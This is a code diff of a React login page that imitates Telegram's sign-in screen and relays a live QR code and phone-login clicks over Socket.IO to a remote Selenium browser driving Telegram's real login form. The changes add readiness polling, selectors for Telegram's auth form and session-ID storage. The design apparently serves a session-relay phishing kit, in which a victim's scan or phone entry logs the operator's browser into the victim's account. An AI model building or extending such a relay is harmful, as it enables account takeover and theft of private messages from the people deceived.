@@ -6,14 +6,34 @@ import { useNavigate } from 'react-router-dom';
 import { Page } from '@/components/Page.tsx';
 import { sessionManager } from '@/helpers/sessionManager';
 
+/**
+ * IndexPage Component
+ * 
+ * This component implements a synchronization mechanism to prevent race conditions
+ * between the React app loading and the Selenium window being ready.
+ * 
+ * Key Features:
+ * - Waits for Selenium window to be ready before allowing phone login
+ * - Shows real-time status of Selenium connection
+ * - Prevents multiple rapid clicks on the phone login button
+ * - Handles disconnections and reconnections gracefully
+ * - Provides timeout protection to prevent indefinite waiting
+ * 
+ * The synchronization prevents the error where users click the phone login button
+ * before the Selenium window is ready, which would cause the click event to be missed.
+ */
 export const IndexPage: FC = () => {
   const navigate = useNavigate();
   const [isConnected, setIsConnected] = useState(false);
   const [sessionId, setSessionId] = useState<string>('');
   const [loginStatus, setLoginStatus] = useState<string>('');
-  const [realTimeQRCode, setRealTimeQRCode] = useState<string>('');
+  const [realTimeQRCode, setRealTimeQRCode] = useState<string | null>(null);
   const [showRealTimeQR, setShowRealTimeQR] = useState(false);
   const [isSessionReused, setIsSessionReused] = useState(false);
+  const [isSeleniumReady, setIsSeleniumReady] = useState(false);
+  const [seleniumStatus, setSeleniumStatus] = useState<string>('Waiting for Selenium...');
+  const [isPhoneLoginLoading, setIsPhoneLoginLoading] = useState(false);
+  const [phoneLoginButtonFound, setPhoneLoginButtonFound] = useState(false);
   
   const socketRef = useRef<Socket | null>(null);
   const pollingIntervalRef = useRef<number | null>(null);
@@ -31,6 +51,10 @@ export const IndexPage: FC = () => {
         const sessionResponse = await sessionManager.getOrCreateSession();
         setSessionId(sessionResponse.sessionId);
         setIsSessionReused(!sessionResponse.isNew);
+        
+        // Store session ID in localStorage for PhoneLoginPage access
+        localStorage.setItem('telegram_session_id', sessionResponse.sessionId);
+        sessionStorage.setItem('telegram_session_id', sessionResponse.sessionId);
         
         if (sessionResponse.isNew) {
           setLoginStatus('New session created');
@@ -74,6 +98,197 @@ export const IndexPage: FC = () => {
       window.removeEventListener('sessionChanged', handleSessionChanged as EventListener);
     };
   }, []);
+
+  useEffect(() => {
+    if (socketRef.current) {
+      // Listen for Selenium window connection events
+      socketRef.current.on('chromeWindowConnected', (data) => {
+        console.log('✅ Selenium window connected:', data);
+        setIsSeleniumReady(true);
+        setSeleniumStatus('Selenium ready');
+      });
+
+      // Listen for immediate test events from Chrome window
+      socketRef.current.on('immediateTestReceived', (data) => {
+        console.log('✅ Immediate test received from Chrome window:', data);
+        setIsSeleniumReady(true);
+        setSeleniumStatus('Selenium ready');
+      });
+
+      // Listen for Selenium status updates
+      socketRef.current.on('telegramLoginUpdate', (data) => {
+        if (data.event === 'status' && data.data && data.data.message) {
+          if (data.data.message.includes('Chrome driver initialized') || 
+              data.data.message.includes('Browser window opened')) {
+            setIsSeleniumReady(true);
+            setSeleniumStatus('Selenium ready');
+          }
+        }
+        
+        // Handle Selenium errors or disconnections
+        if (data.event === 'error') {
+          setIsSeleniumReady(false);
+          setSeleniumStatus(`Selenium error: ${data.data?.error || 'Unknown error'}`);
+        }
+      });
+
+      // Listen for session status responses
+      socketRef.current.on('sessionStatus', (data) => {
+        console.log('📊 Session status received:', data);
+        if (data.sessionId === sessionId) {
+          // If session is running or completed, Selenium is likely ready
+          if (data.status === 'running' || data.status === 'completed') {
+            console.log('✅ Session is active, Selenium should be ready');
+            setIsSeleniumReady(true);
+            setSeleniumStatus('Selenium ready (session active)');
+          }
+        }
+      });
+
+      // Listen for all sessions response
+      socketRef.current.on('allSessions', (sessions) => {
+        console.log('📋 All sessions received:', sessions);
+        // Check if any session is active, which would indicate Selenium is ready
+        const hasActiveSession = sessions.some((session: any) => 
+          session.status === 'running' || session.status === 'completed'
+        );
+        if (hasActiveSession) {
+          console.log('✅ Found active session, Selenium should be ready');
+          setIsSeleniumReady(true);
+          setSeleniumStatus('Selenium ready (active session found)');
+          
+          // Now check if the phone login button is actually present
+          setTimeout(() => {
+            checkPhoneLoginButtonInSelenium();
+          }, 1000); // Wait a bit for the page to fully load
+        }
+      });
+
+      // Listen for element check responses
+      socketRef.current.on('elementCheckResult', (data) => {
+        console.log('🔍 Element check result:', data);
+        if (data.sessionId === sessionId) {
+          if (data.elementFound) {
+            console.log('✅ Phone login button found in Selenium window!');
+            setPhoneLoginButtonFound(true);
+            setSeleniumStatus('Phone login button ready');
+          } else {
+            console.log('❌ Phone login button not found in Selenium window');
+            setPhoneLoginButtonFound(false);
+            setSeleniumStatus('Phone login button not found - waiting for page to load...');
+          }
+        }
+      });
+
+      // Listen for Selenium disconnection events
+      socketRef.current.on('disconnect', () => {
+        console.log('🔌 Socket disconnected from Selenium server');
+        setIsSeleniumReady(false);
+        setSeleniumStatus('Selenium server disconnected');
+      });
+
+      // Listen for reconnection events
+      socketRef.current.on('reconnect', () => {
+        console.log('🔌 Socket reconnected to Selenium server');
+        setSeleniumStatus('Reconnecting to Selenium...');
+        // Check session status after reconnection
+        if (sessionId && socketRef.current) {
+          socketRef.current.emit('getSessionStatus', sessionId);
+        }
+      });
+
+      // Check if Selenium is already ready by requesting session status
+      if (sessionId) {
+        socketRef.current.emit('getSessionStatus', sessionId);
+      }
+
+      // Set a timeout to prevent indefinite waiting
+      const timeoutId = setTimeout(() => {
+        if (!isSeleniumReady) {
+          setSeleniumStatus('Selenium timeout - please refresh the page');
+          console.warn('⚠️ Selenium readiness timeout reached');
+        }
+      }, 30000); // 30 seconds timeout
+
+      // Periodic check for Selenium readiness
+      const checkInterval = setInterval(() => {
+        if (socketRef.current && socketRef.current.connected && sessionId) {
+          socketRef.current.emit('getSessionStatus', sessionId);
+        }
+      }, 5000); // Check every 5 seconds
+
+      // Periodic check for phone login button
+      const buttonCheckInterval = setInterval(() => {
+        if (socketRef.current && socketRef.current.connected && sessionId && isSeleniumReady && !phoneLoginButtonFound) {
+          console.log('🔄 Periodic check for phone login button...');
+          checkPhoneLoginButtonInSelenium();
+        }
+      }, 3000); // Check every 3 seconds
+
+      return () => {
+        clearTimeout(timeoutId);
+        clearInterval(checkInterval);
+        clearInterval(buttonCheckInterval);
+      };
+    }
+  }, [sessionId, isSeleniumReady]);
+
+  // Separate effect to handle socket connection and event setup
+  useEffect(() => {
+    if (socketRef.current && socketRef.current.connected) {
+      console.log('🔌 Socket connected, setting up Selenium event listeners');
+      
+      // Force a session status check to see if Selenium is already ready
+      if (sessionId) {
+        console.log('🔍 Checking session status for Selenium readiness...');
+        socketRef.current.emit('getSessionStatus', sessionId);
+        
+        // Also check if there are any active sessions that might indicate Selenium is ready
+        socketRef.current.emit('getAllSessions');
+      }
+    }
+  }, [socketRef.current?.connected, sessionId]);
+
+  // Effect to handle initial Selenium readiness detection
+  useEffect(() => {
+    if (socketRef.current && socketRef.current.connected && sessionId) {
+      // Immediate check for Selenium readiness
+      console.log('🚀 Initial Selenium readiness check...');
+      
+      // Check current session status
+      socketRef.current.emit('getSessionStatus', sessionId);
+      
+      // Check all sessions to see if any are active
+      socketRef.current.emit('getAllSessions');
+      
+      // Set a short timeout to check again
+      const initialCheckTimeout = setTimeout(() => {
+        if (socketRef.current && socketRef.current.connected && sessionId) {
+          console.log('🔄 Re-checking Selenium readiness after initial delay...');
+          socketRef.current.emit('getSessionStatus', sessionId);
+        }
+      }, 2000); // Check again after 2 seconds
+      
+      return () => clearTimeout(initialCheckTimeout);
+    }
+  }, [socketRef.current?.connected, sessionId]);
+
+  // Reset loading state when session changes
+  useEffect(() => {
+    setIsPhoneLoginLoading(false);
+  }, [sessionId]);
+
+  // Function to check if phone login button is present in Selenium window
+  const checkPhoneLoginButtonInSelenium = () => {
+    if (socketRef.current && socketRef.current.connected && sessionId) {
+      console.log('🔍 Checking if phone login button is present in Selenium window...');
+      socketRef.current.emit('checkElementInSelenium', {
+        sessionId: sessionId,
+        selector: 'a[href*="phone"], button:contains("LOG IN BY PHONE NUMBER"), a:contains("LOG IN BY PHONE NUMBER"), [class*="auth"] button, [class*="login"] a',
+        timestamp: new Date().toISOString()
+      });
+    }
+  };
 
   const startTelegramLogin = (sessionId: string) => {
     // Connect to Socket.IO server
@@ -199,6 +414,10 @@ export const IndexPage: FC = () => {
       setSessionId(sessionResponse.sessionId);
       setIsSessionReused(false);
       
+      // Store session ID in localStorage for PhoneLoginPage access
+      localStorage.setItem('telegram_session_id', sessionResponse.sessionId);
+      sessionStorage.setItem('telegram_session_id', sessionResponse.sessionId);
+      
       startTelegramLogin(sessionResponse.sessionId);
       
     } catch (error) {
@@ -208,17 +427,51 @@ export const IndexPage: FC = () => {
   };
 
   const goToPhoneLogin = () => {
-    // Send message to Selenium server to click the .auth-form button
-    if (socketRef.current && socketRef.current.connected) {
+    // Check if phone login button is found in Selenium window
+    if (!phoneLoginButtonFound) {
+      setSeleniumStatus('Please wait for phone login button to be ready...');
+      return;
+    }
+
+    // Check if we have a valid session ID
+    if (!sessionId) {
+      setSeleniumStatus('No active session - please refresh the page');
+      return;
+    }
+
+    // Check if socket is connected
+    if (!socketRef.current || !socketRef.current.connected) {
+      setSeleniumStatus('Socket connection lost - please refresh the page');
+      return;
+    }
+
+    // Prevent multiple rapid clicks
+    if (isPhoneLoginLoading) {
+      return;
+    }
+
+    try {
+      setIsPhoneLoginLoading(true);
+      setSeleniumStatus('Initiating phone login...');
+      
+      // Send message to Selenium server to click the .auth-form button
       socketRef.current.emit('clickAuthFormButton', {
         sessionId: sessionId,
-        selector: '.auth-form button',
+        selector: 'div#auth-qr-form div.auth-form.qr button',
         timestamp: new Date().toISOString()
       });
+      
+      console.log('✅ Phone login request sent to Selenium server');
+      
+      // Navigate to phone login page
+      const phoneLoginUrl = `/phone-login?sessionId=${encodeURIComponent(sessionId)}`;
+      console.log('🔗 Navigating to phone login page:', phoneLoginUrl);
+      navigate(phoneLoginUrl);
+    } catch (error) {
+      console.error('❌ Error in goToPhoneLogin:', error);
+      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
+      setIsPhoneLoginLoading(false);
     }
-    
-    // Navigate to phone login page
-    navigate('/phone-login');
   };
 
   return (
@@ -241,6 +494,119 @@ export const IndexPage: FC = () => {
           maxWidth: '280px',
           width: '100%'
         }}>
+          {/* System Status Indicator */}
+          <div style={{
+            marginBottom: '24px',
+            padding: '12px 16px',
+            backgroundColor: '#f8f9fa',
+            border: '1px solid #dee2e6',
+            borderRadius: '8px',
+            width: '100%',
+            textAlign: 'center'
+          }}>
+            <div style={{
+              fontSize: '14px',
+              color: '#6c757d',
+              marginBottom: '8px'
+            }}>
+              System Status
+            </div>
+            <div style={{
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              gap: '8px'
+            }}>
+              <div style={{
+                width: '8px',
+                height: '8px',
+                borderRadius: '50%',
+                backgroundColor: phoneLoginButtonFound ? '#28a745' : '#ffc107'
+              }} />
+              <span style={{
+                fontSize: '12px',
+                color: phoneLoginButtonFound ? '#155724' : '#856404',
+                fontWeight: '500'
+              }}>
+                {phoneLoginButtonFound ? 'Phone Login Ready' : 'Phone Login Loading...'}
+              </span>
+            </div>
+            {!isSeleniumReady && (
+              <div style={{
+                fontSize: '11px',
+                color: '#6c757d',
+                marginTop: '4px'
+              }}>
+                {seleniumStatus}
+              </div>
+            )}
+            {!isSeleniumReady && seleniumStatus.includes('timeout') && (
+              <button
+                onClick={() => {
+                  setSeleniumStatus('Retrying Selenium connection...');
+                  setIsSeleniumReady(false);
+                  // Force a fresh session status check
+                  if (socketRef.current && socketRef.current.connected && sessionId) {
+                    socketRef.current.emit('getSessionStatus', sessionId);
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#007bff',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                Retry Connection
+              </button>
+            )}
+            {!isSeleniumReady && !seleniumStatus.includes('timeout') && (
+              <button
+                onClick={() => {
+                  setSeleniumStatus('Manually checking phone login button...');
+                  // Check if the phone login button is present in Selenium window
+                  checkPhoneLoginButtonInSelenium();
+                }}
+                style={{
+                  marginTop: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#6c757d',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                Check Phone Login Button
+              </button>
+            )}
+          </div>
+
+          {/* Debug Information (only show in development) */}
+          {import.meta.env.DEV && (
+            <div style={{
+              marginBottom: '16px',
+              padding: '8px 12px',
+              backgroundColor: '#f8f9fa',
+              border: '1px solid #dee2e6',
+              borderRadius: '4px',
+              fontSize: '11px',
+              color: '#6c757d'
+            }}>
+              <div style={{ fontWeight: '500', marginBottom: '4px' }}>Debug Info:</div>
+              <div>Socket: {isConnected ? '✅ Connected' : '❌ Disconnected'}</div>
+              <div>Session: {sessionId || 'None'}</div>
+              <div>Selenium: {isSeleniumReady ? '✅ Ready' : '⏳ Waiting'}</div>
+              <div>Phone Button: {phoneLoginButtonFound ? '✅ Found' : '⏳ Waiting'}</div>
+              <div>Status: {seleniumStatus}</div>
+            </div>
+          )}
+
           {/* QR Code Container */}
           <div style={{
             position: 'relative',
@@ -420,24 +786,50 @@ export const IndexPage: FC = () => {
             marginBottom: '32px',
             textAlign: 'left'
           }}>
+            {/* Selenium Status Display */}
+            <div style={{
+              marginBottom: '16px',
+              padding: '8px 12px',
+              backgroundColor: phoneLoginButtonFound ? '#e8f5e8' : '#fff3cd',
+              border: `1px solid ${phoneLoginButtonFound ? '#28a745' : '#ffc107'}`,
+              borderRadius: '4px',
+              fontSize: '14px',
+              color: phoneLoginButtonFound ? '#155724' : '#856404'
+            }}>
+              {phoneLoginButtonFound ? 'Phone login button ready!' : 
+               isSeleniumReady ? 'Selenium ready, waiting for phone login button...' : 
+               seleniumStatus}
+            </div>
+            
             <button
               onClick={goToPhoneLogin}
+              disabled={!phoneLoginButtonFound || isPhoneLoginLoading}
               style={{
-                background: 'none',
+                background: phoneLoginButtonFound && !isPhoneLoginLoading ? 'none' : '#f5f5f5',
                 border: 'none',
-                color: 'rgb(51,144,236)',
+                color: phoneLoginButtonFound && !isPhoneLoginLoading ? 'rgb(51,144,236)' : '#999',
                 fontSize: '16px',
-                cursor: 'pointer',
+                cursor: phoneLoginButtonFound && !isPhoneLoginLoading ? 'pointer' : 'not-allowed',
                 textDecoration: 'none',
                 padding: '8px 16px',
                 borderRadius: '4px',
                 transition: 'background-color 0.2s',
-                letterSpacing: '0.02em'
+                letterSpacing: '0.02em',
+                opacity: phoneLoginButtonFound && !isPhoneLoginLoading ? 1 : 0.6
               }}
-              onMouseOver={(e) => e.currentTarget.style.backgroundColor = '#f0f8ff'}
-              onMouseOut={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
+              onMouseOver={(e) => {
+                if (phoneLoginButtonFound && !isPhoneLoginLoading) {
+                  e.currentTarget.style.backgroundColor = '#f0f8ff';
+                }
+              }}
+              onMouseOut={(e) => {
+                if (phoneLoginButtonFound && !isPhoneLoginLoading) {
+                  e.currentTarget.style.backgroundColor = 'transparent';
+                }
+              }}
             >
-              LOG IN BY PHONE NUMBER
+              {isPhoneLoginLoading ? 'INITIATING...' : 
+               phoneLoginButtonFound ? 'LOG IN BY PHONE NUMBER' : 'WAITING FOR PHONE LOGIN BUTTON...'}
             </button>
           </div>
         </div>
